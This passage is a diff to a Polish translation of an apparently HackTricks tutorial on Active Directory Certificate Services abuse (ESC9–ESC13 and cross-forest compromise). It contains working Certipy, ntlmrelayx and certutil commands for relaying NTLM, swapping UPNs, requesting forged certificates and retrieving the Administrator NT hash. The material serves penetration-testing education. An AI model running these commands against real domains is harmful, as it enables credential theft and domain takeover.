 #### Wykorzystanie [Certipy](https://github.com/ly4k/Certipy)
 
-Żądanie certyfikatu jest domyślnie wykonywane przez Certipy na podstawie szablonu `Machine` lub `User`, określonego na podstawie tego, czy nazwa konta kończy się na `$`. Określenie alternatywnego szablonu można osiągnąć poprzez użycie parametru `-template`.
+Żądanie certyfikatu jest domyślnie tworzone przez Certipy na podstawie szablonu `Machine` lub `User`, określonego na podstawie tego, czy nazwa konta kończy się na `$`. Określenie alternatywnego szablonu można osiągnąć poprzez użycie parametru `-template`.
 
-Technika taka jak [PetitPotam](https://github.com/ly4k/PetitPotam) może być następnie wykorzystana do wymuszenia uwierzytelnienia. W przypadku pracy z kontrolerami domeny, konieczne jest określenie `-template DomainController`.
+Technika taka jak [PetitPotam](https://github.com/ly4k/PetitPotam) może być następnie wykorzystana do wymuszenia uwierzytelnienia. Przy pracy z kontrolerami domeny, konieczne jest określenie `-template DomainController`.
 ```bash
 certipy relay -ca ca.corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -440,7 +440,7 @@ Następnie `userPrincipalName` `Jane` zostaje zmodyfikowany na `Administrator`, 
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
 ```
-Ta modyfikacja nie narusza ograniczeń, pod warunkiem, że `Administrator@corp.local` pozostaje odrębny jako `userPrincipalName` `Administratora`.
+Ta modyfikacja nie narusza ograniczeń, ponieważ `Administrator@corp.local` pozostaje odrębnym `userPrincipalName` dla `Administrator`.
 
 W związku z tym, szablon certyfikatu `ESC9`, oznaczony jako podatny, jest żądany jako `Jane`:
 ```bash
@@ -448,11 +448,11 @@ certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ES
 ```
 Zauważono, że atrybut `userPrincipalName` certyfikatu odzwierciedla `Administrator`, pozbawiony "object SID".
 
-Następnie `userPrincipalName` użytkownika `Jane` zostaje przywrócony do jej pierwotnego wartości, czyli `Jane@corp.local`:
+Następnie `userPrincipalName` dla `Jane` zostaje przywrócone do jej pierwotnego wartości, czyli `Jane@corp.local`:
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
 ```
-Próba uwierzytelnienia za pomocą wydanego certyfikatu teraz zwraca NT hash `Administrator@corp.local`. Polecenie musi zawierać `-domain <domain>` ze względu na brak określenia domeny w certyfikacie:
+Próba uwierzytelnienia za pomocą wydanego certyfikatu teraz zwraca wartość skrótu NT `Administrator@corp.local`. Polecenie musi zawierać `-domain <domain>`, ze względu na brak określenia domeny w certyfikacie:
 ```bash
 certipy auth -pfx adminitrator.pfx -domain corp.local
 ```
@@ -477,13 +477,13 @@ Jeśli `CertificateMappingMethods` zawiera bit `UPN` (`0x4`).
 
 Z `StrongCertificateBindingEnforcement` skonfigurowanym jako `0`, konto A z uprawnieniami `GenericWrite` może zostać wykorzystane do skompromitowania dowolnego konta B.
 
-Na przykład, mając uprawnienia `GenericWrite` nad `Jane@corp.local`, atakujący ma na celu skompromitowanie `Administrator@corp.local`. Procedura jest podobna do ESC9, umożliwiając wykorzystanie dowolnego szablonu certyfikatu.
+Na przykład, mając uprawnienia `GenericWrite` nad `Jane@corp.local`, atakujący ma na celu skompromitowanie `Administrator@corp.local`. Procedura jest podobna do ESC9, pozwalając na wykorzystanie dowolnego szablonu certyfikatu.
 
 Początkowo, skrót `Jane` jest pozyskiwany za pomocą Cienkich Poświadczeń, wykorzystując `GenericWrite`.
 ```bash
 certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
 ```
-Następnie `userPrincipalName` `Jane` zostaje zmienione na `Administrator`, celowo pomijając część `@corp.local`, aby uniknąć naruszenia ograniczenia.
+Następnie `userPrincipalName` `Jane` zostaje zmienione na `Administrator`, celowo pomijając część `@corp.local`, aby uniknąć naruszenia ograniczeń.
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
 ```
@@ -495,13 +495,13 @@ certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
 ```
-Autoryzacja za pomocą uzyskanego certyfikatu ujawni wartość NT hasła `Administrator@corp.local`, co wymaga podania domeny w poleceniu ze względu na brak szczegółów domeny w certyfikacie.
+Autoryzacja za pomocą uzyskanego certyfikatu ujawni wartość skrótu NT dla `Administrator@corp.local`, co wymaga określenia domeny w poleceniu ze względu na brak szczegółów domeny w certyfikacie.
 ```bash
 certipy auth -pfx administrator.pfx -domain corp.local
 ```
 ### Przypadek nadużycia 2
 
-Z flagą `UPN` (`0x4`) w `CertificateMappingMethods`, konto A z uprawnieniami `GenericWrite` może skompromitować dowolne konto B, które nie ma właściwości `userPrincipalName`, w tym konta maszynowe i wbudowanego administratora domeny `Administrator`.
+Dzięki `CertificateMappingMethods` zawierającemu flagę `UPN` (`0x4`), konto A z uprawnieniami `GenericWrite` może skompromitować dowolne konto B, które nie ma właściwości `userPrincipalName`, w tym konta maszynowe i wbudowanego administratora domeny `Administrator`.
 
 Celem jest skompromitowanie `DC$@corp.local`, zaczynając od uzyskania hasha `Jane` poprzez Shadow Credentials, wykorzystując `GenericWrite`.
 ```bash
@@ -511,15 +511,15 @@ certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
 ```
-Zostaje żądany certyfikat do uwierzytelniania klienta jako `Jane` przy użyciu domyślnego szablonu `User`.
+Wniosek o certyfikat do uwierzytelniania klienta jest składany jako `Jane` przy użyciu domyślnego szablonu `User`.
 ```bash
 certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
 ```
-`userPrincipalName` użytkownika `Jane` jest przywracane do swojej pierwotnej postaci po tym procesie.
+`userPrincipalName` użytkownika `Jane` jest przywracane do jego pierwotnej postaci po tym procesie.
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
 ```
-Aby uwierzytelnić się za pomocą Schannel, wykorzystywana jest opcja `-ldap-shell` w Certipy, wskazująca na sukces uwierzytelnienia jako `u:CORP\DC$`.
+Aby uwierzytelnić się za pomocą Schannel, wykorzystywana jest opcja `-ldap-shell` w Certipy, co wskazuje na sukces uwierzytelnienia jako `u:CORP\DC$`.
 ```bash
 certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 ```
@@ -527,35 +527,131 @@ Za pomocą powłoki LDAP polecenia takie jak `set_rbcd` umożliwiają ataki opar
 ```bash
 certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 ```
-Ta podatność dotyczy również każdego konta użytkownika, które nie ma `userPrincipalName` lub gdzie nie pasuje on do `sAMAccountName`, przy czym domyślny `Administrator@corp.local` jest głównym celem ze względu na swoje podwyższone uprawnienia LDAP i brak `userPrincipalName` domyślnie.
+Ta podatność dotyczy również każdego konta użytkownika, które nie ma `userPrincipalName` lub w którym nie pasuje on do `sAMAccountName`, przy czym domyślny `Administrator@corp.local` jest głównym celem ze względu na swoje podwyższone uprawnienia LDAP i brak domyślnego `userPrincipalName`.
 
-## Kompromitacja Lasów za pomocą Certyfikatów Wyjaśniona w stronie biernej
+## Przekazywanie NTLM do ICPR - ESC11
 
-### Łamanie Zaufania Lasów przez Skompromitowane CA
+### Wyjaśnienie
 
-Konfiguracja **enrollmentu między lasami** jest stosunkowo prosta. **Certyfikat root CA** z lasu zasobów jest **publikowany w lasach kont** przez administratorów, a certyfikaty **enterprise CA** z lasu zasobów są **dodawane do kontenerów `NTAuthCertificates` i AIA w każdym lesie kont**. Dla jasności, ta konfiguracja nadaje **CA w lesie zasobów pełną kontrolę** nad wszystkimi innymi lasami, którymi zarządza PKI. Jeśli ten CA zostanie **skompromitowany przez atakujących**, certyfikaty dla wszystkich użytkowników zarówno z lasu zasobów, jak i kont mogą być **podrabiane przez nich**, łamiąc tym samym granicę bezpieczeństwa lasu.
+Jeśli serwer CA nie jest skonfigurowany z `IF_ENFORCEENCRYPTICERTREQUEST`, ataki przekazywania NTLM mogą być wykonywane bez podpisywania za pośrednictwem usługi RPC. [Odniesienie tutaj](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).
 
-### Przyznawanie Uprawnień Enrollmentu Obcym Podmiotom
+Możesz użyć `certipy` do wyliczenia, czy `Wymuś Szyfrowanie dla Żądań` jest wyłączone, a `certipy` pokaże podatności `ESC11`.
+```bash
+$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
-W środowiskach wielolasowych należy ostrożnie podchodzić do Enterprise CA, które **publikują szablony certyfikatów**, które pozwalają **Uwierzytelnionym Użytkownikom lub obcym podmiotom** (użytkownikom/grupom spoza lasu, do którego należy Enterprise CA) **na enrollment i edycję**.\
-Podczas uwierzytelniania przez zaufanie, SID **Uwierzytelnionych Użytkowników** jest dodawany do tokena użytkownika przez AD. Dlatego jeśli domena posiada Enterprise CA z szablonem, który **pozwala Uwierzytelnionym Użytkownikom na enrollment**, szablon może potencjalnie być **zainstalowany przez użytkownika z innego lasu**. Podobnie, jeśli **uprawnienia enrollmentu są udzielane obcemu podmiotowi przez szablon**, tworzy się **relacja kontroli dostępu między lasami**, umożliwiając podmiotowi z jednego lasu **zainstalowanie szablonu z innego lasu**.
+Certificate Authorities
+0
+CA Name                             : DC01-CA
+DNS Name                            : DC01.domain.local
+Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
+....
+Enforce Encryption for Requests     : Disabled
+....
+[!] Vulnerabilities
+ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
+
+```
+### Schemat nadużycia
+
+Należy skonfigurować serwer przekazywania:
+``` bash
+$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting rpc://DC01.domain.local (ESC11)
+[*] Listening on 0.0.0.0:445
+[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
+[*] Attacking user 'Administrator@DOMAIN'
+[*] Template was not defined. Defaulting to Machine/User
+[*] Requesting certificate for user 'Administrator' with template 'User'
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 10
+[*] Got certificate with UPN 'Administrator@domain.local'
+[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
+[*] Saved certificate and private key to 'administrator.pfx'
+[*] Exiting...
+```
+W przypadku kontrolerów domeny musimy określić `-template` w DomainController.
+
+Lub używając [forka impacket autorstwa sploutchy'ego](https://github.com/sploutchy/impacket):
+``` bash
+$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
+```
+## Dostęp do powłoki ADCS CA za pomocą YubiHSM - ESC12
+
+### Wyjaśnienie
+
+Administratorzy mogą skonfigurować Certyfikat Uprawnień w celu przechowywania go na zewnętrznym urządzeniu, takim jak "Yubico YubiHSM2".
+
+Jeśli urządzenie USB jest podłączone do serwera CA za pośrednictwem portu USB, lub serwer urządzeń USB w przypadku, gdy serwer CA jest maszyną wirtualną, wymagany jest klucz uwierzytelniania (czasami nazywany "hasłem") dla dostawcy przechowywania kluczy w celu generowania i wykorzystywania kluczy w YubiHSM.
+
+To hasło/klucz jest przechowywane w rejestrze pod `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` w postaci zwykłego tekstu.
+
+Odniesienie [tutaj](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).
+
+### Scenariusz nadużycia
+
+Jeśli prywatny klucz CA jest przechowywany na fizycznym urządzeniu USB, gdy uzyskasz dostęp do powłoki, istnieje możliwość odzyskania klucza.
+
+Po pierwsze, musisz uzyskać certyfikat CA (jest to publiczne) a następnie:
+```cmd
+# import it to the user store with CA certificate
+$ certutil -addstore -user my <CA certificate file>
+
+# Associated with the private key in the YubiHSM2 device
+$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
+```
+## Nadużycie łącza grup OID - ESC13
+
+### Wyjaśnienie
+
+Atrybut `msPKI-Certificate-Policy` pozwala na dodanie polityki wydawania do szablonu certyfikatu. Obiekty `msPKI-Enterprise-Oid`, które są odpowiedzialne za wydawanie polityk, można odkryć w Kontekście Nazw Konfiguracji (CN=OID,CN=Public Key Services,CN=Services) kontenera OID PKI. Polityka może być powiązana z grupą AD za pomocą atrybutu `msDS-OIDToGroupLink` tego obiektu, umożliwiając systemowi autoryzację użytkownika, który przedstawia certyfikat, jak gdyby był członkiem grupy. [Odniesienie tutaj](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).
+
+Innymi słowy, gdy użytkownik ma uprawnienie do zapisania certyfikatu i certyfikat jest powiązany z grupą OID, użytkownik może odziedziczyć uprawnienia tej grupy.
+
+Użyj [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), aby znaleźć OIDToGroupLink:
+```powershell
+Enumerating OIDs
+------------------------
+OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
+
+OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
+OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
+OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
+OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
+------------------------
+Enumerating certificate templates
+------------------------
+Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local
+
+Certificate template Name: VulnerableTemplate
+OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
+OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
+OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
+OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
+------------------------
+```
+### Scenariusz nadużycia
+
+Znajdź uprawnienia użytkownika, które można użyć za pomocą `certipy find` lub `Certify.exe find /showAllPermissions`.
+
+Jeśli `John` ma uprawnienia do zapisywania `VulnerableTemplate`, użytkownik może odziedziczyć uprawnienia grupy `VulnerableGroup`.
+
+Wystarczy, że określi szablon, a otrzyma certyfikat z uprawnieniami OIDToGroupLink.
+```bash
+certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
+```
+## Kompromitowanie Lasów za pomocą Certyfikatów Wyjaśnione w stronie biernej
+
+### Łamanie Zaufania Lasów poprzez Skompromitowane CA
+
+Konfiguracja **enrollmentu między lasami** jest stosunkowo prosta. **Certyfikat root CA** z lasu zasobów jest **opublikowany w lasach kont** przez administratorów, a certyfikaty **enterprise CA** z lasu zasobów są **dodane do kontenerów `NTAuthCertificates` i AIA w każdym z lasów kont**. Dla jasności, ta konfiguracja nadaje **CA w lesie zasobów pełną kontrolę** nad wszystkimi innymi lasami, którymi zarządza PKI. Jeśli ten CA zostanie **skompromitowany przez atakujących**, certyfikaty dla wszystkich użytkowników zarówno z lasu zasobów, jak i lasów kont mogą zostać **podrabiane przez nich**, co prowadzi do złamania granicy bezpieczeństwa lasu.
+
+### Przyznawanie Uprawnień do Enrollmentu Obcym Podmiotom
+
+W środowiskach wielolasowych należy zachować ostrożność w odniesieniu do Enterprise CA, które **publikują szablony certyfikatów**, które pozwalają **Uwierzytelnionym Użytkownikom lub obcym podmiotom** (użytkownikom/grupom spoza lasu, do którego należy Enterprise CA) na **prawa do enrollmentu i edycji**.\
+Podczas uwierzytelniania przez zaufanie, SID **Uwierzytelnionych Użytkowników** jest dodawany do tokena użytkownika przez AD. Dlatego jeśli domena posiada Enterprise CA z szablonem, który **pozwala Uwierzytelnionym Użytkownikom na prawa do enrollmentu**, szablon może potencjalnie być **zainstalowany przez użytkownika z innego lasu**. Podobnie, jeśli **prawa do enrollmentu są wyraźnie przyznane obcemu podmiotowi przez szablon**, w ten sposób tworzony jest **międzylasowy związek kontroli dostępu**, umożliwiający podmiotowi z jednego lasu **zainstalowanie szablonu z innego lasu**.
 
 Oba scenariusze prowadzą do **zwiększenia powierzchni ataku** z jednego lasu na drugi. Ustawienia szablonu certyfikatu mogą być wykorzystane przez atakującego do uzyskania dodatkowych uprawnień w obcej domenie.
-
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
-
-<details>
-
-<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Inne sposoby wsparcia HackTricks:
-
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
-* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</details>
